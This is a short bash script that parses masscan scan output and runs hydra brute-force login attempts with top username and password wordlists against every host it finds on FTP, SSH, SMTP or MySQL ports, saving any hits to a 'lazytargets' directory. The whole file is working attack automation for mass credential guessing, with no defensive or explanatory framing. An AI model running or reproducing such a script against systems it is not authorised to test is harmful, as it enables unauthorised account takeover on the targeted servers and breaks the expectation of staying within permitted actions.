#!/bin/bash

# used in hydra attack
# use preferred list if possible
# too much words required up to 6 hours
usersList=../wordlist/top-users.txt
passwordsList=../wordlist/top-passwords.txt

# masscan_output.gnmap input
# hydra user/password attack on popular protocols
hydratest(){
  echo "[hydra] attacking network protocols"
  while read line; do
    IP=$(echo $line | awk '{ print $4 }')
    PORT=$(echo $line | awk -F '[/ ]+' '{print $7}')
    PROTOCOL=$(echo $line | awk -F '[/ ]+' '{print $10}')
    FILENAME=$(echo $line | awk -v PORT=$PORT '{ print "hydra_"PORT"_"$4}' )

    if [ "$PROTOCOL" = "ftp" -o "$PROTOCOL" = "ssh" -o "$PROTOCOL" = "smtp" -o "$PROTOCOL" = "mysql" ]; then
      echo "[hydra] scanning $IP on $PORT port using $PROTOCOL protocol"
      hydra -o ~/lazytargets/hydra/$FILENAME -b text -L $usersList -P $passwordsList -s $PORT $IP $PROTOCOL
    fi
  done < $1
}

hydratest $1